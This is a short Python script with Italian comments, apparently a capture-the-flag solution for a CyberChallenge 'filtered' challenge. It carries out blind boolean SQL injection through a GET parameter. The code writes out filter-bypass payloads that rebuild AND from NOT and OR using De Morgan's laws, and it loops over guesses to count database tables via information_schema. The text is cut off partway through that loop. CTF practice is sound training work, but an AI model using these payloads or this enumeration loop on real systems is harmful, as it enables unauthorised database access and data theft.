# Esempio di payload base: sfrutta le leggi di De Morgan per simulare AND con NOT e OR
# http://filtered.challs.cyberchallenge.it/post.php?id=-1' OR NOT( NOT(id=3) OR NOT(1=1) ) OR '0

if __name__ == '__main__':
    url = 'http://filtered.challs.cyberchallenge.it/post.php'  # URL dell'endpoint vulnerabile
    
    # Fase 1: Scopro quante sono le tabelle
    # Payload che conta le tabelle nel database corrente usando information_schema.tables
    # La condizione è vera quando il conteggio corrisponde al numero testato
    payload = "?id=-1' OR NOT( NOT(id=3) OR NOT((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) = {}) ) OR '0"

    tables = 0  # Contatore per il numero di tabelle
    while True:  # Ciclo infinito fino a trovare il numero esatto
        question = payload.format(tables)  # Inserisce il numero corrente nel payload
        response = requests.get(f'{url}{question}')  # Invia la richiesta GET
        if response.status_code >= 200 and response.status_code < 300:  # Controlla se la risposta è valida
